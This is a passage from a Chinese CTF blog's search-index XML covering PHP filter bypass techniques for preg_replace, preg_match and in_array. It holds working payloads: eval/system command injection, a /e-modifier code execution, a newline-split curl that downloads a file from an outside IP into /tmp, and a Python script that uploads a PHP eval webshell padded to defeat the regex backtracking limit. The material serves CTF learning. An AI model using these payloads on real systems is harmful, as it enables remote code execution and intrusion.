class="variable">%FE</span><span class="variable">%01</span>sF<span class="variable">%DC</span><span class="variable">%91</span>f<span class="variable">%B6</span><span class="variable">%7</span>E<span class="variable">%11</span><span class="variable">%8</span>F<span class="variable">%02</span><span class="variable">%9</span>A<span class="variable">%B6</span><span class="variable">%21</span><span class="variable">%B2V</span><span class="variable">%0</span>F<span class="variable">%F9</span><span class="variable">%CAg</span><span class="variable">%CC</span><span class="variable">%A8</span><span class="variable">%C7</span><span class="variable">%F8</span><span class="variable">%5</span>B<span class="variable">%A8Ly</span><span class="variable">%03</span><span class="variable">%0</span>C<span class="variable">%2</span>B<span class="variable">%3</span>D<span class="variable">%E2</span><span class="variable">%18</span><span class="variable">%F8m</span><span class="variable">%B3</span><span class="variable">%A9</span><span class="variable">%09</span><span class="variable">%01</span><span class="variable">%D5</span><span class="variable">%DFE</span><span class="variable">%C1O</span><span class="variable">%26</span><span class="variable">%FE</span><span class="variable">%DF</span><span class="variable">%B3</span><span class="variable">%DC8</span><span class="variable">%E9j</span><span class="variable">%C2</span>/<span class="variable">%E7</span><span class="variable">%BDr</span><span class="variable">%8</span>F<span class="variable">%0</span>EE<span class="variable">%BC</span><span class="variable">%E0F</span><span class="variable">%D2</span><span class="variable">%3</span>CW<span class="variable">%0</span>F<span class="variable">%EB</span><span class="variable">%14</span><span class="variable">%13</span><span class="variable">%98</span><span class="variable">%BBU.</span><span class="variable">%F5</span><span class="variable">%A0</span><span class="variable">%A8</span><span class="variable">%2</span>B<span class="variable">%E31</span><span class="variable">%FE</span><span class="variable">%A4</span><span class="variable">%807</span><span class="variable">%B8</span><span class="variable">%B5</span><span class="variable">%D7</span><span class="variable">%1</span>F<span class="variable">%0</span>E<span class="number">3</span>.<span class="variable">%DF</span><span class="variable">%93</span><span class="variable">%AC5</span><span class="variable">%00</span><span class="variable">%EBM</span><span class="variable">%DC</span><span class="variable">%0</span>D<span class="variable">%EC</span><span class="variable">%C1</span><span class="variable">%A8dy</span><span class="variable">%0</span>Cx<span class="variable">%2</span>Cv<span class="variable">%21</span>V<span class="variable">%60</span><span class="variable">%DD0</span><span class="variable">%97</span><span class="variable">%91</span><span class="variable">%D0k</span><span class="variable">%D0</span><span class="variable">%AF</span><span class="variable">%3</span>F<span class="variable">%98</span><span class="variable">%CD</span><span class="variable">%A4</span><span class="variable">%BCF</span><span class="variable">%29</span><span class="variable">%B1</span></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>绕过</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>preg_replace</title>
    <url>/2024/07/12/preg-replace/</url>
    <content><![CDATA[<p>&emsp;&emsp;preg_replace 函数执行一个正则表达式的搜索和替换。相比于preg_match 函数它多了一个替换的功能（没错，说了一句废话）<br>&emsp;&emsp;通常来说，它有三个参数，perg_repalce($pattern,$repalcement,$subject);–&gt;搜索$subject中匹配$pattern的部分，并以$replacement进行替换。话不多说，看题目就懂了。</p>
<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;str&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/HYNUCTF/&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$str</span> === <span class="string">&quot;HYNUCTF&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;菜，就多练&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;既然HYNUCTF组合会变为空那么可以通过双写拼接进行绕过，原理跟sql注入的关键字绕过差不多。<br>payload：HYNU<font color=red>HYNUCTF</font>CTF<br>&emsp;&emsp;红色部分被替换成了空，那么剩下的就拼接成了是吧。</p>
<h3 id="eval创建新变量绕过"><a href="#eval创建新变量绕过" class="headerlink" title="eval创建新变量绕过"></a>eval创建新变量绕过</h3><p>&emsp;&emsp;这是个很有用的地方，很多题型都适用这个，当遇到过滤了关键字符或者没有头绪的时候，可以使用这个方法进行创建一个新变量去执行它。<br>&emsp;&emsp;例如</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">$str = preg_replace(<span class="string">&#x27;/system/&#x27;</span>,<span class="string">&quot;&quot;</span>,$_GET[<span class="string">&#x27;str&#x27;</span>]);</span><br><span class="line">······</span><br><span class="line">payload：  </span><br><span class="line">?str=<span class="keyword">eval</span>($_GET[<span class="string">&#x27;A&#x27;</span>]);&amp;A=<span class="keyword">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这是利用eval执行system命令去寻找拥有flag的页面，后续同理我们可以使用GET和POST方法来进行绕过。</p>
<h3 id="经典漏洞-e"><a href="#经典漏洞-e" class="headerlink" title="经典漏洞&#x2F;e"></a>经典漏洞&#x2F;e</h3><p>&emsp;&emsp;preg_replace函数的特性，&#x2F;e可执行模式，此为PHP专有参数，例如preg_replace函数。也就是说，它的$repalcement部分会被当做命令执行。  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/HYNUCTF/e&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>],<span class="string">&quot;XTWASYS&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;此时传入?str&#x3D;system(“ls”);就可执行此代码。</p>
]]></content>
      <categories>
        <category>绕过</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>preg_match</title>
    <url>/2024/06/12/preg-match/</url>
    <content><![CDATA[<p>&emsp;&emsp;正则匹配也是php中最常见的一种，一般用来做一个<del>装饰</del>匹配作用，我们通常用以下几种绕过方式来规避正则匹配。</p>
<h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><p>&emsp;&emsp;正则匹配后面都会有一个修饰符，各位要判断相应的修饰符选择哪一种绕过方式，别无脑套，推荐一个网站<a href="https://www.jyshare.com/front-end/854/">正则表达式在线测试</a>,它提供了修饰符的介绍和语法参考，方便我们继续匹配。། – _ – །</p>
<h3 id="换行符绕过（-0a）"><a href="#换行符绕过（-0a）" class="headerlink" title="换行符绕过（%0a）"></a>换行符绕过（%0a）</h3><p>&emsp;&emsp;通常的，preg_match()函数只能匹配一行数据，尤其是遇到这种情况<br><img data-src="/images/ciscn.png" alt="ciscn"><br>&emsp;&emsp;看着如此长的过滤，但因为修饰符只有一个i（忽略大小写），我们可以直接%0a绕过(过滤点的方式可以将IP转成十进制)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cmd=cu%0arl+http://795973494:8000/s -o /tmp/s</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;简单的来说，当遇到修饰符只有i的时候，可以用换行符%0a秒了。</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">preg_match</span><span class="params">(<span class="string">&#x27;/^flag$/i&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>])</span></span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;因此我们传入?a&#x3D;flag%0a即可绕过</p>
<h3 id="利用数组绕过"><a href="#利用数组绕过" class="headerlink" title="利用数组绕过"></a>利用数组绕过</h3><p>&emsp;&emsp;同md5()函数原理，当参数是数组类型的时候，会以报错的形式来绕过判断。但值得一提的是，整个if条件不执行，如果里面是输出flag形式的，此方法无用。例如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$a</span>)==<span class="literal">false</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这种我们可以用数组进行绕过，绕if条件报错。</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="string">?a</span>[]=flag.php</span><br></pre></td></tr></table></figure>

<h3 id="PCRE回溯限制绕过"><a href="#PCRE回溯限制绕过" class="headerlink" title="PCRE回溯限制绕过"></a>PCRE回溯限制绕过</h3><p>&emsp;&emsp;如何绕过呢，让回溯次数超过最大限制就可以使preg_match()函数返回false，从而绕过限制，中文的回溯次数在100万次就好崩溃，这个回溯保护使PHP为了防止关于正则表达式的DDOS<br>payload:<br>GET:</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">import</span> <span class="variable">requests</span></span><br><span class="line"><span class="variable">from</span> <span class="variable">io</span> <span class="variable">import</span> <span class="variable">BytesIO</span></span><br><span class="line"></span><br><span class="line"><span class="variable">payload</span> =<span class="function"><span class="title">BytesIO</span>(<span class="variable">b</span><span class="string">&#x27;[]&#x27;</span>+<span class="variable">b</span><span class="string">&#x27;a&#x27;</span>*<span class="number">1000000</span>)</span></span><br><span class="line"><span class="variable">res</span> = <span class="variable">requests.get</span>(<span class="string">&#x27;[]?[]=&#x27;</span>+<span class="function"><span class="title">str</span>(<span class="variable">payload</span>))</span></span><br><span class="line"><span class="function"><span class="title">print</span>(<span class="variable">res.text</span>)</span></span><br></pre></td></tr></table></figure>
<p>POST:  </p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="keyword">from</span> io import BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&#x27;file&#x27;</span>: BytesIO(b<span class="string">&#x27;aaa&lt;?php eval($_POST[txt]);//&#x27;</span> + b<span class="string">&#x27;a&#x27;</span> * 1000000)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&#x27;[]&#x27;</span>, <span class="attribute">files</span>=files, <span class="attribute">allow_redirects</span>=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(res.headers)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;[]即代表根据题目来填充</p>
<h3 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h3><p>&emsp;&emsp;就是通过URL编码进行取反绕过，当然其他编码也是可以的，进制就更不用说了（通常使用十六进制），这里略微举个例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&quot;phpinfo&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>取反得到%8F%97%8F%96%91%99%90（取反使用的使不可见字符，遇到&#x2F;s还是得寄）</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">?code=$_=~(%8F%97%8F%96%91%99%90);$_();</span><br></pre></td></tr></table></figure>


<h3 id="5c绕过"><a href="#5c绕过" class="headerlink" title="%5c绕过"></a>%5c绕过</h3><p>&emsp;&emsp;这个不常见，%5c其实就是”\“,了解一下就可以了</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">preg_match</span><span class="params">(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$act</span>)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">/i</span>不区分大小写</span><br><span class="line"></span><br><span class="line"><span class="string">/s</span>匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[fnrtv]</span><br><span class="line"></span><br><span class="line"><span class="string">/D</span>如果使用$限制结尾字符,则不允许结尾有换行;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这里存在&#x2F;s和&#x2F;D因此它会匹配到换行，%0a因此就无法绕过。这时候就可以使用%5c</p>
<h3 id="单引号绕过"><a href="#单引号绕过" class="headerlink" title="单引号绕过"></a>单引号绕过</h3><p>&emsp;&emsp;这个也不常用，在每一个字符前加上单引号可以绕过preg_match的匹配。<br><img data-src="/images/%E5%8D%95%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87.png" alt="单引号绕过"></p>
]]></content>
      <categories>
        <category>绕过</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>in_array</title>
    <url>/2024/07/13/in-array/</url>
    <content><![CDATA[<p>&emsp;&emsp;in_array函数的功能用于检查数组是否存在某个值。定义：布尔型函数，参数为（$needle,$haystack,[$strict &#x3D; FALSE]）,在$haystack中搜索$needle,如果第三个参数$strict的值为TRUE(没有默认为FALSE),则该函数会进行强检查（相等于&#x3D;&#x3D;&#x3D;），检查$needle的类型是否和$haystack中的相同。<font color=red>如果找到$haystack，则返回TRUE,否则返回FALSE。</font></p>
<h3 id="in-array缺陷"><a href="#in-array缺陷" class="headerlink" title="in_array缺陷"></a>in_array缺陷</h3><p>&emsp;&emsp;根据上面所描述的，当该函数没有设置第三个参数的时候，只会进行弱类型比较（相当于&#x3D;&#x3D;），也就是不会检查数据类型，例如<br><img data-src="/images/in_array%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7.png" alt="in_array"><br>&emsp;&emsp;根据上面白名单规定，只能上传1~24的文件名，因为没有第三个参数，进行弱比较，所以我们上传3shell.php的时候，只要第一个匹配就可以了，从而绕过了白名单，达到了任意文件上传的目的。类似的还有：  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="number">3</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$whitelist</span> = <span class="title function_ invoke__">range</span>(<span class="number">1</span>,<span class="number">5</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$id</span>,<span class="variable">$whitelist</span>))</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这里我们有没有设置第三个参数，进行弱类型比较，同样绕过了白名单，这里需要注意的是in_array的返回类型，匹配了返回什么，还有注意前面的！，在preg_match等匹配的时候有常出现，要知道它的作用。</p>
]]></content>
      <categories>
        <category>小知识</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
</search>
